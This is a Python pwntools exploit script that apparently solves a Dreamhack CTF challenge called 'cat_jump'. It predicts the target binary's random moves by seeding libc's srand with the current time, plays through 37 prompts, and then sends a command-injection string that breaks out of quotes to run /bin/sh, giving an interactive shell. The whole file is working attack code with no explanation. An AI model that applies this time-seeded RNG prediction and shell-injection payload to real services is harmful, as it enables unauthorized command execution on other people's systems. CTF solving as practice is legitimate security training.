#!/usr/bin/env python3
from pwn import *
from ctypes import *
import time

context.log_level = 'debug'
context.binary = elf = ELF('./cat_jump', checksec=False)

libc_py = cdll.LoadLibrary('libc.so.6')
libc = elf.libc

gs = """
b *main
"""
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 17533)
    else:
        return process(elf.path)

io = start()
success(libc_py.time(0))
#timeout
libc_py.srand(libc_py.time(0) - 5)
io.recvuntil(b"let the cat reach the roof! ")
sleep(1)

for i in range(37):
	choice = libc_py.rand() % 2

	if choice == 1:
		sla(b': ',b'h')
	else:
		sla(b': ',b'l')
	libc_py.rand()
sa(b":", b"shell\";/bin/sh;echo\"oke")
io.interactive()